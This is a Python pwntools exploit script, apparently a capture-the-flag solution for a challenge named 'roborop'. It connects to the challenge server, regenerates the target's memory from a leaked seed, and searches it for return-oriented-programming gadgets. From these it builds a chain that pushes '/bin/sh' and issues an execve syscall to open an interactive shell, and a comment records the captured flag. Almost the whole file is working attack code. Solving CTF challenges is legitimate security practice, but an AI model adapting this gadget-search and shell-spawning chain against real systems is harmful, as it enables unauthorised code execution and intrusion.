from pwn import *
from ctypes import *

import subprocess

context.terminal = ['kitty']
context.arch = "amd64"


local = False

while True:
    if local:
        seed = 0
        addr = 0x40000000
        r = gdb.debug('./roborop_patched', '''
    c
    ''')
    else:
        r = remote('roborop-1.play.hfsc.tf', 1993)

        r.recvuntil(b'seed: ')
        seed = int(r.recvline().strip(), 16)
        r.recvuntil(b'addr: ')
        addr = int(r.recvline().strip(), 16)

    print(f'{seed=:#x}')
    print(f'{addr=:#x}')

    # Generate memory dump
    subprocess.run(['./gen', str(seed)], check=True)


    with open('/tmp/mem.bin', 'rb') as f:
        mem = f.read()

    def gadget_addr(gadget: str):
        offset = mem.find(asm(gadget))
        if offset == -1:
            print(f"Failed to find {gadget}")
            exit(0)
        return offset + addr

    # find addr in libc and use binsh there?

    push_pop_pop = None
    for reg in ['rax', 'rbx', 'rcx', 'rsi', 'rdx']:
        try:
            push_pop_pop = gadget_addr(f"push rsp; pop rdi; pop {reg}; ret")
            break
        except:
            pass

    if push_pop_pop is None:
        print("Failed to find gadget, retrying...")
        r.close()
        continue

    chain = [
        push_pop_pop,
        u64(b'/bin/sh\x00'),
        gadget_addr("pop rax; ret"),
        0x3b,
        gadget_addr("pop rsi; ret"),
        0,
        gadget_addr("pop rdx; ret"),
        0,
        gadget_addr("syscall"),
    ]


    print([hex(i) for i in chain])

    r.sendlineafter(b'rops: ', b''.join(p64(i) for i in chain))
    r.interactive()
    break

# midnight{spR4Y_aNd_pR4Y}
